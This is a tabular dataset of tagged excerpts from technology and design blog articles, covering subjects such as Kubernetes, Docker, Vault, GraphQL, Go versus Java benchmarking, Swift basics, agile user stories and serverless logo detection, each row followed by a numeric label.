3588,"The following are some of the Kubernetes Objects:pods Namespaces Replication Controller (Manages Pods)Deployment Controller (Manages Pods)Stateful Sets Daemon Sets Services Config Maps Volumes Before starting, lets look at what is docker container first? Any application requires software to run, some sort of configuration (between environments) and dependent libraries. Docker makes it easy to package all of them together and ship it as one standalone package. Docker Container image is a lightweight, executable software that package application, environment and dependent libraries. Docker Container image become containers at runtime. We can create any number of containers from Container Image. In terms of Java world, Container Image is a Java Class and running containers are the objects that we can instantiate by using Class.","['Kubernetes', 'Microservices', 'Docker', 'DevOps']",7
3589,"Lets start our discussion with basic building block of K8s In Docker World, Every Microservice is deployed as Container. In K8s world, A Pod is the basic building block of K8s Objects. A pod is a colocated group of containers. A pod can contain single container as well. But when it contains multiple containers, all of the containers are running on single worker node. A pod wont distribute across multiple worker nodes.","['Kubernetes', 'Microservices', 'Docker', 'DevOps']",7
3590,"The commands are pretty simple to use and you need to write a manifest either in YAML or JSON notation. To create a Pod: Pod manifest sample: spring-app.yamlkind: Represent the type of k8s object created. It can be a Pod, Daemon Set, Deployments or Service.version: K8s api version used to create the resource, It can be v1, v1beta and v2. Some of the resources can be released under beta and available for general public usage.metadata: provides information about the resource like name of the pod, namespace under which the pod will be running,labels and annotations.spec: consists of the core information about pod. Here we will tell k8s what would be the expected state of resource, Like container image, number of replicas, environment variables and volumes.status: consists of information about the running pod, status of each container. Status field is supplied and updated by Kubernetes after creation.","['Kubernetes', 'Microservices', 'Docker', 'DevOps']",7
3591,"Were a team of six designers, and I needed to figure out how we were going to help the National Railway solve these challenges that come with privatization; and the switch to a new technology platform and design. We had to keep the existing channels up and running (to sell tickets), and at the same time build new features, that we would continuously implement. So the old and new design needed to live side-by-side. We also needed to do research and learn how users actually experience and use our channels. To design so continuously has been a very new challenge for me as a designer, and also to be a design lead. I havent done a project like this before, so I needed to figure out how to make a new design system and decide how we do research.","['User Experience', 'Design', 'Research', 'UX Research', 'UX Design']",6
3592,"But when you do digital product design, its never done. So continuous design is the perspective that design is never done. Its a continuous, circular process of designing, implementing, people using it in the real world, and the team learning about the users experiences. So you dont just make things and then produce them. Its designing and learning, and I think weve spent too little time learning because its often not a priority. You need to deliver the features that the users want in a good way at a very rapid speed. If youre Spotify or if youre Enjoy HQ, the users dont careit needs to be fast. How competitive you are as a business depends on your ability to engage in continuous conversation with your customers through digital products. You can think of research tools as a way to be able to have that conversation with the users, to document it and be able to share the learning in the organization. You are giving the employees access to very valuable research, and at the same time, making the business able to check if it actually delivers value to your customers.","['User Experience', 'Design', 'Research', 'UX Research', 'UX Design']",12
3593,"Sofia: Can you give us a couple of examples of feedback loops a continuous designer can build today to help her team? Maria: We made a button in our solution that says, Give us feedback. It opens the email client and then you can email us feedback. So we get raw text from the users, and we get around 30 emails each day. Since we turned on that button, weve gotten approximately 2,300 emails. And they all come into us as Trello cards, forwarded from an email address. When they come into Trello, we sort and prioritize them. Some people want the same feature and then we bundle that up.","['User Experience', 'Design', 'Research', 'UX Research', 'UX Design']",6
3594,"Sofia: Do you have any examples of how NOT having a continuous design process made your job more difficult? Maria: Heres one failure that Ill share relating to the National Railway project. When the train isnt running, you need to show people different options, right? So we sometimes setup buses instead. We hire buses, and people can take the bus the same distance as they would take the train. In those cases we also need to communicate that there is a walking distance, because you have to walk from the station to the bus stop. But for longer walking distances in the travel app we hadnt defined which icon would show up. Suddenly, a lot of users got a lot of UFO icons, because it turned out when the system didnt know the method of transport the user was taking it would just show a UFO, because some clever developer used UFOs in the test-system to identify unknown transportation. We would get screenshots from people saying, There are UFOs in app? Sofia: In instances like the ones you just described, how do you manage the situation so that it doesnt make the whole team fearful of trying to iterate? Maria: I think its a complex answerwere going from a state where we used to have a monopoly, to a state where were competing, so if were not able to deliver fast enough then its over and out. I think the whole privatization happening on top of making new things, you need to take more risk because you need to move faster. I think a lot of businesses are in that position of being disrupted. You can see it in banking, insurance, transport, and a lot of other solutions as well. So how do you move fast enough? With good feedback loops that can help uncover bugs and critical mistakes and a team that is able to respond fast, its not that risky to make mistakes. The whole team is responsible for what is put in productionand for listening when we start learning how it is perceived/experienced by our users.","['User Experience', 'Design', 'Research', 'UX Research', 'UX Design']",1
3595,"Node is an execution environment and comes with a package manager called npm The P __url__ defines third-party dependencies and build scripts Third-party dependencies are downloaded to a sub-directory of the project called node_modules (contrast to Maven which uses a configurable directory defaulting to a user directory common to many projects)Typically these commands are used in the development workflownpm installdownload third-party dependencies to node_modules directorynpm startexecute program from source codenpm testexecute unit test suitenpm buildoptimise and package for production Historically developers have had to download and install a whole suite of languages, compilers, databases and analysers to their local machine. They also installed a similar but often different toolset to one or more CI servers. Over time as the team gradually changes and the project evolves, and due to individuals being individuals, the CI servers and each developer machine is slightly different. Then the build breaks or a bug is raised to the sound of If you were a diligent team, you had a wiki page detailing how new starters could get up and running. But when the newbie did arrive they spent days (or weeks Im not exaggerating) to get up and running. Fortunately we had a project manager who knew a solution.","['Docker', 'DevOps', 'Software Development', 'Automation', 'Technology']",18
3596,"Back in the dark ages a good developer would run the unit tests locally before pushing. It wasnt too bad that it took 5 minutes because they could go and make a brew. The CI system was left to run the long test suite. When something went wrong the developer could not always run it locally because the CI suite was setup differently to their environment. Maybe because it was a big project and being a back-end developer they only have half the build stack. The only way to fix the problem was to look at the CI logs, push a change that might help and wait and repeat.","['Docker', 'DevOps', 'Software Development', 'Automation', 'Technology']",13
3597,"The next script is related to Vault. This script will start vault then configure vault to be able to create secrets for our database. The script looks like this: This script is intended to be run when the vault container starts. This means that this script is responsible to ensure the server starts and stays running. Once that is complete, we then write out our configuration using the vault command. After that is all done, we let the script hang with the vault server portion with the wait command. This is because the script is what actually started the server and when this script ends, so will the docker container.","['Docker', 'Vault', 'Postgres', 'Development']",7
3598,"One of the first bits in the script is to take VAULT_TOKEN variable that is passed and make that our dev server token. Now, a Vault token is your key in getting things out of vault. To ensure that we know the key, instead of doing the default behavior of generating a random key, we tell the server which token to use. And to make it even easier, we let the docker container pass us one token through VAULT_TOKEN and we tie that to the VAULT_DEV_ROOT_TOKEN_ID so we dont have to define that twice. And just to be extra clear, VAULT_TOKEN is what a client uses, the VAULT_DEV_ROOT_TOKEN_ID is what the server itself uses. If we didnt provide that dev token, the server would generate a random token that makes it a lot harder to development against. This is the difference between our dev Vault instance and a production one. In dev, we can define that token up front, in production, those are randomly generated for you.","['Docker', 'Vault', 'Postgres', 'Development']",7
3599,"The next interesting bits are the connection and role setup. One quick thing I want to point out that the paths follow a pattern. The name dbs comes from where we enabled the database plugin. There are then 3 sub paths of that, config, roles and creds. The config path is where the configuration to our database is stored. Next we add to the roles part which defines what roles can create credentials to our database with the config. Then there is a creds key that actually creates the credentials when it is read, more on using that later.","['Docker', 'Vault', 'Postgres', 'Development']",11
3600,"The postgres credentials use and management is worth a blog post all together but let me talk about this really quick. With Vault, we are creating temporary roles that will come and go at will. When we use those credentials from Vault to also manage the schema (e.g. creating tables), we need to pay extra close attention on who actually owns those tables. When you create a table, who ever the role is that you are currently working as is the role that will be the owner of said table. Then, your next role will have issues actually accessing that table unless permissions and ownership have been setup correctly. I have a dba.stackexchange question related this that will have a longer blog post later.","['Docker', 'Vault', 'Postgres', 'Development']",8
3601,"The vault section is mostly straight forward. In the environment variables (starting line 20) we have two definitions, one for our token, another one for the address of the running vault instance. The first is the token we use for our dev server as well as accessing that server (remember: we define the token and use it in our script for the dev server). The next variable needs to be defined because by default vault will try and use https. Looks kind of silly that you need to define the local server, but thats alright. The volume section adds our script to the container from our local disk, and then we override the default command to run that script.","['Docker', 'Vault', 'Postgres', 'Development']",7
3602,"Lets start off at the same baseline. A resolver is a function that resolves a value for a type or field in a schema. Resolvers can return objects or scalars like Strings, Numbers, Booleans, etc. If an Object is returned, execution continues to the next child field. If a scalar is returned (typically at a leaf node), execution completes. If null is returned, execution halts and does not continue.","['GraphQL', 'API', 'Architecture', 'Graphql Resolver', 'Best Practices']",3
3603,"Before we continue, its worth noting that a Graph QL server has built-in default resolvers, so you dont have to specify a resolver function for every field. A default resolver will look in root to find a property with the same name as the field. An implementation likely looks like this: Where should we fetch data? What are the tradeoffs with our options? In the next few examples, we will refer back to this schema:context is a mutable Object that is provided to all resolvers. Its created and destroyed between every request. It is a great place to store common Auth data, common models/fetchers for APIs and databases, etc. At Pay Pal, were a big N __url__ shop w/ infrastructure built on Express, so we store Express req in there.","['GraphQL', 'API', 'Architecture', 'Graphql Resolver', 'Best Practices']",11
3604,This brings us to the third section of the article: Virtual Machines Virtual machines separate the software applications from the hardware of a computer system. We can clone a computer system by creating its virtual machine. VMs provide an abstraction layer and hide the complexities of underlying hardware components. VMs can be used to operate the physical hardware systems. They have been heavily used in the industry for over a decade now. A hypervisor process launches virtual machines.,"['Fintech', 'Containers', 'Programming', 'Software Development', 'Architecture']",16
3605,"Scenario: Lets assume you want to launch two VMs within a Windows OS. In addition to it, you desire to host your server code (services) on one VM and the client code (UI) of your application on the other VM. You might decide to prepare a VM with Windows OS and then clone it. The fact that you have now cloned a VM introduces duplication of OS and libraries. It also means that the drivers will need to live in both of the OS. Therefore both of the VMs in turn will consume larger memory space. Subsequently, you can only launch a handful of VMs on the physical server.","['Fintech', 'Containers', 'Programming', 'Software Development', 'Architecture']",7
3606,"In a VM, a host OS is installed that communicates with the hardware. Then the binaries are installed on the guest VM. Additional applications such as web applications, database servers etc are then installed on the VM. On the other hand, in a container application, multiple guest OS can be installed on a host OS and each guest OS can host a separate application. As an instance, web application can be deployed on a different guest OS than the database server. All of the guest OS communicate to the same underlying hardware.","['Fintech', 'Containers', 'Programming', 'Software Development', 'Architecture']",7
3607,"Scenario: Lets assume a scenario that you want to deploy an application to a container. You can then make your application level updates and directly deploy the artifacts on the container image. The container image can then be deployed to the host OS. Furthermore, you can build an image and deploy it from development to test to production environments. The consistency in images encourages stability in the application across systems. Each image can therefore be versioned and its progress over time can be tracked. Furthermore the minimal size of container images reduces the time it is required to deliver an enterprise level application.","['Fintech', 'Containers', 'Programming', 'Software Development', 'Architecture']",7
3608,"The #1 thing I look for in any interview: is this someone I can work with? Know that your interviewer at Fresh Works is vested in you the same way you are vested in them. You both need to collaborate together and navigate this interview successfully. Dont let your interview turn into simple question and answer turnarounds. Ask for clarity on a question, follow ups. Collaboration is a core value at Fresh Works.","['Interview', 'Tech Interview', 'Freshworks', 'Interview Tips', 'Interview Questions']",0
3609,"When it comes to intermediate developers Im looking for both breadth and depth of knowledge. At the intermediate level, Im looking for you to know your stuff across the software development cycle. You dont need to know specific technologies or stacks but you need to know which realm theyre in. For example: If you dont know much about docker, you should at least know about virtual machines. You dont need to know anything about Laravel and Eloquent but you need to know what an MVC framework or an Object Relational Mapper (ORM) is and you should have used one before. On the front-end side of things, if you havent worked with one of React/Angular/Vue JS, its an uphill battle.","['Interview', 'Tech Interview', 'Freshworks', 'Interview Tips', 'Interview Questions']",19
3610,"This is something I learnt from our HR Manager. Ive found the best answers always follow the STAR approach. If I ask if you have developed a full MVC application before, you could answer with a simple Yes. A better answer could be Yes, I built a blog app using a MEAN stack. An even better answer would go something like this: Yes. When I was applying for jobs and writing my resume, I took the time out to make a sample project to showcase my abilities and stand out from the competition. I chose a basic blogging application which captures the basics of what I wanted to demonstrate like CRUD operations, authentication, authorization etc. I used a LAMP stack and deployed it on AWS. My MVC Framework was Laravel with Vue JS and Bootstrap 4 on the front-end. I began by defining the data model with associations and then incrementally built up the Controllers and Views as I went along. The project includes RESTful APIs along with Unit Tests using PHP Unit. You can view it on Githubthe link is there in my resume.","['Interview', 'Tech Interview', 'Freshworks', 'Interview Tips', 'Interview Questions']",0
3611,"I always give time at the end for the interviewee to ask me any questions they may have. This is your opportunity to make an impression; and if the interview went badly, to salvage it. For me, the best questions are those that are beneficial to the both of us. Ive had many people ask me about how is it like working there? or what do you love most about working at Fresh Works? These are good questions and Ill answer them enthusiastically.","['Interview', 'Tech Interview', 'Freshworks', 'Interview Tips', 'Interview Questions']",0
3612,"So far this is just a basic git repo. The magic happens when we add our __url__ file. Simply adding this file configures and enables Continuous Integration for our project. When we commit the file, and on any subsequent commit, Git Lab will run the pipeline for us. Add this file to your repo for a very basic Terraform pipeline: Note: If you dont name this __url__ it wont be used to configure a pipeline. Lets walk through some highlights in this file: Git Lab runs pipelines in what it calls Runners. There are various ways to configure Runners, and one convenient option is to use ephemeral Docker containers. This is how Runners are configured for us when we use Git Lab.com. This line of configuration specifies that our Runner container should use the terraform image provided by Hashicorp, as it contains the tools we need.","['Terraform', 'Gitlab', 'Continuous Integration', 'DevOps', 'Google Cloud Platform']",7
3613,"Thankfully, there is a secure way to provide these credentials to our Runner when the pipeline executes. Git Lab allows you to store variables and retrieve them from the runtime environment of the Runner. In the Git Lab UI, navigate to Settings > CI/CD and expand the Variables section. We will create a SERVICEACCOUNT variable to match our pipeline configuration. The value of this variable must be a string, so we will encode our service account file: Copy and paste the output of this command into the value of the variable and click Save Variable. Git Lab has a concept of protected variables to limit their use to specific git branches, but thats beyond the scope of this post.","['Terraform', 'Gitlab', 'Continuous Integration', 'DevOps', 'Google Cloud Platform']",18
3614,"In our case, backend services are primarily written in Java, and their schemas are stitched together by our Apollo Server, which we call Niobe. For now, since Apollo Gateway and Schema Composition are not yet live, all our backend services are name-spaced by service. This is why exploring the playground begins with a list of service names. The next level down in the tree is the service method. As I mention in the talk, Schema Composition, a new concept unveiled by the Apollo team, should help us build a more sane schema model. More on that in the coming months.","['GraphQL', 'Airbnb', 'JavaScript', 'Front End Development']",10
3615,"As we flow through the if statement, we first check if has Coffee, since we dont have coffee, we skip down to the else clause and set made Cup to false. Some developers will add in else/if statements in between for any other cases. Heres how that looks: In the above example, we first set age to 16 and age Description is just declared as a String type. The if statement first checks to see if age < 13. Since our age is 16 that is not true so we move down to the next statement else if age <= 18, this time the evaluation results in a true statement so we set age Description = ""You are a teenager."". Because we hit a branch we were looking for we stop checking the age variable and return from the if statement. In other words, the else statement is never even seen.","['Swift', 'Programming', 'Decision Making', 'Loop', 'Swift Programming']",9
3616,"Breaking this down line by line:while true means run indefinitely. true is a constant for 1. false is a constant for __url__ current Number % number To Count By!= 0. If the remainder of 11 / 4 is not 0, add 1 to current Number, so we dont trap ourselves in an infinite loop, and skip over this iteration using continue. If we didnt finish performing the logic for this round Add the current Number to the sum Of All Numbers. We know when this executes it will have to be a number divisible by number To Count By based on the prior logic.current Number += 1. I know it looks like we already did this, but we really havent. If our current Number was not divisible by number To Count By evenly, then we added 1 to current Number and skipped over everything else. We never did anything for current Number if the if statement evaluated to false.","['Swift', 'Programming', 'Decision Making', 'Loop', 'Swift Programming']",3
3617,"When we use for (name, type) it can be directly translated to for (key, value) in dictionary. So with that said let us move onward. We iterate through each key-value pair in the dictionary, for every key, or name, we append it to pet Names. For every value, or type, we check to see if we have a key for the type. In the case pet Type Counts keys would be Dog, Cat, Mouse or Cricket. Because dictionary keys may or may not exist, we have to use them as optionals. So first we check if pet Type Counts[name] == nil. If it is we need to set the initial value to 1 since our current iteration holds that type. Otherwise, we do have a value in pet Type Counts[name] and we just need to update the value. Because its optional, we can force unwrap the value using! but be very careful doing this, always make sure the value is not nil beforehand, otherwise! lives up to its name as the crash operator. Your program will crash if it forcefully unwraps a nil value.","['Swift', 'Programming', 'Decision Making', 'Loop', 'Swift Programming']",15
3618,"The cost instrumentation strategy used is a simple one: just counting byte code that are known to be expensive to execute. The methods can be limited in size and jumps count towards the costing budget, allowing us to determine a consistent halting criteria. However it is still possible to construct byte code sequences by hand that take excessive amounts of time to execute. The cost instrumentation is designed to ensure that infinite loops are terminated and that if the cost of verifying a transaction becomes unexpectedly large (e.g., contains algorithms with complexity exponential in transaction size) that all nodes agree precisely on when to quit. It is not intended as a protection against denial of service attacks. If a node is sending you transactions that appear designed to simply waste your CPU time then simply blocking that node is sufficient to solve the problem, given the lack of global broadcast.","['Determinism', 'Smart Contracts', 'Corda', 'Distributed Ledgers', 'JVM']",3
3619,"The budgets are separate per operation code type, so there is no unified cost model. Additionally the instrumentation is high overhead. A more sophisticated design would be to statically calculate byte code costs as much as possible ahead of time, by instrumenting only the entry point of accounting blocks, i.e., runs of basic blocks that end with either a method return or a backwards jump. Because only an abstract cost matters (this is not a profiler tool) and because the limits are expected to bet set relatively high, there is no need to instrument every basic block. Using the max of both sides of a branch is sufficient when neither branch target contains a backwards jump. This sort of design will be investigated if the per category budget accounting turns out to be insufficient.","['Determinism', 'Smart Contracts', 'Corda', 'Distributed Ledgers', 'JVM']",3
3620,"The standard Java benchmarking library is JMH. Even though it is written and maintained by Oracle, it isnt bundled with the standard library. The recommended way to use JMH is to create a separate benchmarking project. Developers then use maven (the popular third-party project management tool) to run this not-so-simple command: When its time to run your JMH benchmarks, the standard way is to use the commands mvn clean install; java -jar target/benchmarks.jar. This builds and runs the benchmarks in your benchmark project. There are options, lots of them. The JMH code runner has over 30 command line flags. If thats not enough control, you can write your own code runner and configure the options directly: One effect of including a standard benchmark runner in Go is that I have seen many more examples of benchmarking in Go than benchmarking in Java.","['Go', 'Golang', 'Java', 'Programming Languages', 'Benchmarking']",18
3621,"Writing a benchmark in Go is a bit more complicated than writing one in Java. Benchmarking requires multiple runs to get accurate measurements. In Go, you need to explicitly set up the loop for the benchmark run using a value supplied by the benchmark runtime. I also had to write my own blackhole function to eat the output so that it wouldnt be optimized away by the compiler. If you want to set up some data before the test runs, or if you want to exclude some logic from being timed, you can explicitly stop, start, and reset the timer: Javas benchmarking only requires the actual business logic. The looping is done for you, and JMH provides a blackhole utility class to swallow output to prevent optimizing it away: In order to set up the data for the benchmark and exclude the set up time from the measurements, JMH requires you to create a static inner class and annotate it as being State: When using JMH, I couldnt find a way to exclude part of the time inside of a benchmark or to reset the timings.","['Go', 'Golang', 'Java', 'Programming Languages', 'Benchmarking']",3
3622,"You can specify that the benchmarks run for a specific number of times, for a minimum duration, or with a specific number of CPU cores. When you run benchmarks, the output is written to the console in the units that make sense to the benchmarking tool: You can also get the results in JSON: Unfortunately, the JSON output is not very useful. First of all, while each line is valid JSON, there is no wrapping array or object around all of the lines; you have to construct one yourself. You might expect that each benchmark would generate a JSON record with separate fields for the name of the benchmark, the number of iterations it took to get a stable answer, the time it took, and the units. Instead, the records have an Output field, that requires you to merge the value of consecutive records to reconstruct the text output, which then needs to be split on tabs and spaces to find the desired values. Given these limitations, its easier to forgo the JSON, direct the text output to a file, and parse.","['Go', 'Golang', 'Java', 'Programming Languages', 'Benchmarking']",3
3623,"You can choose the time units (ns, ms, etc. ), whether you want throughput (ops/time), average time (time/op), sampling time, or a single run time. You can have the output in text, CSV, SCSV, JSON, or La Te X. You can get it to output some memory or threading profiling results. However, I dont know of any way to use this output with another tool. If you want to get more detailed information, youll need to upgrade to something else.","['Go', 'Golang', 'Java', 'Programming Languages', 'Benchmarking']",8
3624,"As someone who has spent decades writing Java, and several years writing Go, I find these kinds of comparisons fascinating. Lately, Ive been enjoying writing Go more than writing Java. I think the culture of Go better reflects how I like to write software, and benchmarking is another area where Gos approach agrees with my thinking. Go takes the batteries included approach to its standard library and tooling; you get quite a lot included as part of the standard distribution, but that also means accepting the choices made by the team that maintains Go. By including simple benchmarking support as part of the standard library and tooling, and integrating it with a profiling toolkit thats bundled with the Go development tools, you get a good enough solution for the most common cases. But its one that requires you to do some extra work (write your own benchmarking loops and blackhole function) and doesnt do things that the Go team considers unimportant (such as usable JSON output).","['Go', 'Golang', 'Java', 'Programming Languages', 'Benchmarking']",9
3625,"Theres nothing wrong with Javas approach if you agree with the Java design philosophy and culture of Java development. While benchmarking support isnt included in the JDK, Java does bundle some profiling tools like jhat, jstat, and hprof. Unfortunately, they are either considered experimental or produce poor results. Other tools, like JVisual VM and Java Mission Control, have been open sourced and future development is unsure. The net result is that Java relies on third parties to provide large parts of its developer tooling. This has encouraged a robust third-party ecosystem, but this philosophy makes it harder to get started if you dont know where to begin. Also, it is sometimes difficult to get tools to work together. Libraries in Java tend to have lots of configuration choices as the Java ecosystem is focused on configurability. Theres probably no better way to understand the different attitudes about configurability between Java and Go than by looking at their garbage collectors. There are over 50 different flags that you can set to configure the behavior of the multiple garbage collectors included in the JVM. Go has only one garbage collector and there is only one configuration flag for that collector.","['Go', 'Golang', 'Java', 'Programming Languages', 'Benchmarking']",9
3626,"In both cases, these choices are not intrinsic to the language; they are entirely artifacts of culture. This is what makes language wars a bit foolish. Which language you prefer to use is more a matter of the culture that suits your programming style best, and less a matter of the actual functionality the language provides. Its also a matter of exposure; if you dont try other languages, youll never know if theres a better culture fit for you out there. Dont disparage other languages; give them a try and see how they work for you. You might be surprised where you end up.","['Go', 'Golang', 'Java', 'Programming Languages', 'Benchmarking']",9
3627,"Consider the starter approach that a small monolithic application might take. This could be a web app built on flask, or a command-line tool built on click. In the beginning, the application specifies its dependencies in requirements.txt. A minimal __url__ could look like: This setup would not last very long. As release cadence increases, the risk of pulling in a breaking version of some updated package becomes intolerable. The programming team immediately succumbs to the temptation to pin all dependencies, only to run into pip#988, as well as other diamond dependency problems.","['Python', 'Continuous Integration', 'Tech']",18
3628,"We know from user and market research that online ordering, restaurant reviews and search filters are needed. However, we are not sure about the exact requirements2. These are complex features and full functionality cannot be built in one sprint3. We will therefore follow an iterative approach using scrum to implement the features in phases and make necessary changes in each iteration based on feedback4. We will thus have various versions released, with changes in all the features (as applicable) in each version.","['Agile', 'Zomato', 'Scrum', 'User Story', 'Backlog']",6
3629,"As part of agile methodology, we need to follow the below steps:1. Create a list of features we wish to implement for each user story.2. Create a list of user stories within each feature (can be one or many). These are of the form As a < type of user >, I want to < some goal > so that < some reason >3. Add the following details at minimum for each story:a. Add the stories to the product backlog5. Have a scrum planning meeting, prioritise the stories, Push them to the sprint backlog and into the next sprint as version 1.06. Hold daily stand-up meetings to discuss:a. What did we do the previous day?b. What are we going to do today?c. Are there any issues/roadblocks in the way of achieving sprint goals?7. Do a sprint review post sprit completion and deploy the tested and approved changes.8. Have a scrum retrospective meeting to discuss scrum learnings for continuous improvement Post deployment:9. Collect user feedback using various techniques. Combine with already known/planned future changes and decide the next set of changes for the features10. Repeat the steps 1 to 7 to push a new version of changes and enhanced features.","['Agile', 'Zomato', 'Scrum', 'User Story', 'Backlog']",1
3630,"As a user, I want to find nearby restaurants so that I can get food delivered to my address2. As a user I want to add/remove multiple food items so that I can specify what I want to order3. As a user I want to know how much time food delivery will take so that I know how much I have to wait4. As a user I want to call up the restaurant so that I can check progress5. As a user I want to be able to pay COD for my food order Search/Restaurant Filters6. As a user I want to filter restaurants by cuisine and/or restaurant type (caf, pub etc) so that I can narrow down my list7. As a user I want to be able to filter veg and non veg restaurants so that I can specify my preferences Restaurant reviews8. As a user I want to be able to rate my experience of ordering on a scale of 1 to 59. As a user, I want to write my opinions on what I liked/did not like The list above provides basic functionality. Once we see there is enough demand for online ordering and assess the pros and cons of the current set of features, we can enhancements such as the below into release 1.1B. Feature list and User stories (v1.1): Online ordering1. As a user, I want to view popular items and food photos of a restaurant so that I can better choose my food2. As a user I want to be able to see where my delivery guy is on the route to my address3. As a user I want to have flexible online payment options so that I can choose any method of my choice Search/Restaurant Filters4. As a user I want to filter restaurants by offers and discounts available5. As a user I want to be to filter restaurants within a a particular distance of my delivery address Restaurant reviews6. As a user I want to be able to rate my experience on various parameters such as food, delivery, payment, customer service using a scale of 1 to 57. As a user, I want to share photos along with my comments/reviews Another set of enhancements that can be added could be as follows: C. Feature list and User stories (v1.2): Online orderingi. As a user, I want to view curated list or restaurants so that it is easier for me to select a restaurant of my choiceii. As a user I want to be able to repeat my previous orders (with or without modifications) at the click of a buttoniii. As a user I want to be able to contact the delivery person directly to know the delivery status Search/Restaurant Filtersi. As a user I want be able to save filter views so that I can quickly apply them again and view updated restaurants of choice Restaurant reviewsi. As a user I want to know the restaurants recent (last 710) reviews for its delivery so that I have the latest informationii. As a user I want to know the reviews of food bloggers/foodies so that I know how good a restaurant is In this way we can see how enhancements are made incrementally to features to ensure deployment time is low, functionality is not affected and only the most relevant enhancements are included.","['Agile', 'Zomato', 'Scrum', 'User Story', 'Backlog']",6
3631,"Some time ago, we were asked by a client to help them on the technical implementation of a business venture. The idea was to detect brands and logos in TV sports broadcasts and videos in order to measure the brand exposure during e.g. a football match or a ski race. The project was abandoned by the client before the MVP was completed because of commercial reasons. We decided to finish the MVP nevertheless and put part of it online because we reckoned it is fun. Here is how we built a full end-to-end solution on the Google Cloud Platform (GCP).","['Google Cloud Platform', 'Serverless', 'Bigquery', 'Dataflow', 'Logo Detection']",6
3632,"We had already developed a brand detection model in Tensor Flow based on the Tensor Flow Object Detection API that worked reasonably well, at least for the purpose of a prototype. So, all that was left to do was to embed it into an end-to-end architecture that acquires video streams and files, preprocesses them, detects the brands in all the single frames, stores the results in a data warehouse, and calculates and visualises the metrics in a dashboard; everything in almost real time and irrespective of the number of the amount of data that we throw at it (e.g. take ten simultaneous TV broadcasts at 25 fps and youre about to run brand detection on 250 HD images per second). All it takes is a bunch of sysops people that set up, operate, scale up and down, and maintain the infrastructure needed. We dont have such people at Quantworks. We dont even have an IT department. Of course, youll have guessed where this is going (its in the title of this article, after all). As a small startup with quite some data engineering capabilities but no sysops personnel, weve become used (more precisely: addicted) to the blessings of serverless on the GCP. Write your code, test it, deploy it to a service. Plug (the services together) and play. No capacity planning, no manual scaling of infrastructure, no configuration or maintenance of servers. )So, lets recap what had to be done: receive a video stream or a video file; split it into the single frames; run brand detection on each single frame using our Tensor Flow model; dump the results into a data warehouse that allows online analytical processing (OLAP) on a large amount of data; visualise the metrics in a web based dashboard.","['Google Cloud Platform', 'Serverless', 'Bigquery', 'Dataflow', 'Logo Detection']",6
3633,"A behaviour totally acceptable for the original use case (overnight processing of videos) but somewhat unsatisfactory for the demo we have put online is the long processing time of videos. Without going into too much detail, this is due to a pipeline property that limits the full parallelisation of the whole Dataflow pipeline. (For the Dataflow affine among you: we have to materialise the PCollection after a high fan-out Par Do stepone video file split into a lot of single framesin order to prevent Dataflows fusion optimisation which in this case is, well, not really an optimisation; see the Dataflow documentation for more details. )One could mitigate this using Cloud Functions instead of Dataflow, however, this would come at the cost of losing the notion of the bounded PCollection, i.e. of the fixed-size data set enabling the pipeline to know when it is done with processing all the frames (by contrast, Cloud Functions would execute the parallel steps autonomously and without a master process that keeps track of completeness). And the boundedness comes in handy if one wants to show the progress on the frontend or create the output video. We decided to add an additional preprocessing step that splits the video file into several parts before handing them over to Dataflow in order to allow for more parallel processing. This is accomplished with a N __url__ Cloud Function and using FFMPEG. It mitigates the latency problem a little, but doesnt eliminate it.","['Google Cloud Platform', 'Serverless', 'Bigquery', 'Dataflow', 'Logo Detection']",3
3634,Python is a general-purpose programming language. Its simple syntax and clear constructs make it quite easy to learn for beginners. Python is widely used for developing applications but has also gained significant traction for doing scientific research and working with artificial intelligence. There are currently two major versions being used: Python 2 and Python 3. One of the popular projects developed on Python is the Django content management system. Flask is a popular micro-framework for web development.,"['Programming', 'Coding', 'Software Development', 'Web Development', 'Nodejs']",9
3635,"Java is a high-level object-oriented programming language developed by Sun Microsystems and currently maintained by Oracle. Java designed to be portable between different platforms: the sources are compiled to Java bytecode that can be run on a Java Virtual Machine for any platform. Its a highly mature language with a lot of different frameworks for developing web applications, the most popular being Spring. Additionally, Java can be used for developing Android applications. Although there are trends in considering Java old fashioned and inferior to other JVM languages, such as Kotlin, it is still one of the most popular programming languages. Java is extremely popular in the enterprise sector.","['Programming', 'Coding', 'Software Development', 'Web Development', 'Nodejs']",9
3636,"Not only does relational data boast this technical prowess, it also has inertia on its side. Theres a decent chance all the unique problems you might encounter working with relational data have been solved and clearly documented somewhere online. If not, theres an established community with enough knowledge and experience to suss out novel issues. (2,3,4)So structured, tabular, relational databases seem really great. However, as you might have guessed, what was once optimal during the Web 1.0 paradigm will not always be the best way of doing things. In fact, some of the features of relational data that made it such a powerful and revolutionary technology during Web 1.0 are proving to be its greatest weaknesses during Web 2.0.",['Programming'],8
3637,"Neither option 1 nor option 2 is ideal. It would be amazing if we could somehow take advantage of the sweet sweet efficiency of structured data, while avoiding pitfalls like our poor supply chain company has encountered here. In an ideal world, we could use a combination of relational and non-relational data, taking advantage of each type based on context. (1,2,3)No SQL databases achieve exactly this type of functionality. They can store structured and non-structured data to achieve the best of both worlds. In the event that your database needs to store and process structured data, it can do just that, taking advantage of relational datas dizzyingly fast join-based-queries and ACID compliance. In the event that non-structured data comes in, a No SQL database can immediately store it without performing expensive transformations on the data or your tables. Here is an example of a No SQL database using SQL and JSON: In this IBM No SQL database table, JSON unstructured data can be stored as a BLOB type among other predefined columns.",['Programming'],8
3638,"To give an example, long before our rebrand, our heavily optimized Buy page was looking visually dated and didnt match newer pages of our site. It had our older-styled buttons, form fields, and menus. Even the illustrations were out of date. When a break between experiments finally opened up, I suggested refreshing the design of the page. To sweeten the pitch, I showed not just a refreshed design, but a few experiment ideas we could run on a refreshed surface. The team rallied around it, and we successfully shipped the new design.","['Design', 'Design Process', 'UX', 'Product Design', 'Growth Hacking']",6
3639,"When an employee leaves their company, they lose access to that companys Dropbox account and its content. This is as youd expect, and as it should be. As it turns out, however, individuals sometimes use their personal credit card for their employers business account. If that card remains on the business account after they leave, then it will be charged the next time the subscription renews. When the card owner discovers the charge on their statement, they see the web address of the lookup tool: __url__ can.","['Design', 'Design Process', 'UX', 'Product Design', 'Growth Hacking']",17
3640,"These practices have helped me approach growth objectives with a user-centered focus. By thoughtfully applying them in your day-to-day work, you can create great experiences for your users and move the needle while youre at it. Do you have growth design practices youve refined on your own? I love talking about this stuff. Want more from the Dropbox Design team? Follow our publication, Twitter, and Dribbble.","['Design', 'Design Process', 'UX', 'Product Design', 'Growth Hacking']",6
